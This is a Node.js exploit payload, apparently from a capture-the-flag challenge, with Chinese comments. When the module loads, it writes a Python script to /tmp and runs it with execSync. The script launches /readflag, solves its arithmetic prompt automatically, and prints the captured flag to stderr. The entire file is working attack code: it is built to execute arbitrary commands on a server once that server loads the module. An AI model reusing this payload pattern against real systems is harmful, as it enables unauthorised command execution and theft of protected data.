const { execSync, spawn } = require('child_process');
const fs = require('fs');

console.error("\n\n[EXPLOIT] Payload Triggered! Starting attack...\n\n");

try {
    // 写入 Python 脚本来处理交互（Python 处理数学题更方便）
    const pythonScript = `
import os, sys, subprocess, re

def log(msg):
    sys.stderr.write(f"[EXPLOIT] {msg}\\n")

def pwn():
    target = "/readflag"
    if not os.path.exists(target):
        log("Target not found")
        return

    try:
        log("Running /readflag...")
        p = subprocess.Popen(
            [target], 
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, 
            text=True,
            bufsize=0
        )
        
        buffer = ""
        while True:
            char = p.stdout.read(1)
            if not char: break
            buffer += char
            if "input your answer:" in buffer: break
        
        log(f"Question: {buffer}")
        match = re.search(r'(\d+)\\s*([+\\-*])\\s*(\d+)', buffer)
        
        if match:
            n1 = int(match.group(1))
            op = match.group(2)
            n2 = int(match.group(3))
            
            res = 0
            if op == '+': res = n1 + n2
            elif op == '-': res = n1 - n2
            elif op == '*': res = n1 * n2
            
            log(f"Answer: {res}")
            p.stdin.write(f"{res}\\n")
            p.stdin.flush()
            
            flag = p.stdout.read()
            # 这里的格式是为了让 flag 在日志里非常显眼
            print(f"\\n\\n[+] FLAG: {flag}\\n\\n", file=sys.stderr)
        else:
            log("Regex failed")

    except Exception as e:
        log(f"Error: {e}")

pwn()
`;
    
    fs.writeFileSync('/tmp/pwn_final.py', pythonScript);
    execSync('python3 /tmp/pwn_final.py', { stdio: 'inherit' });

} catch (e) {
    console.error("[EXPLOIT] Error: " + e.message);
}

// 导出空对象以防报错
module.exports = {};
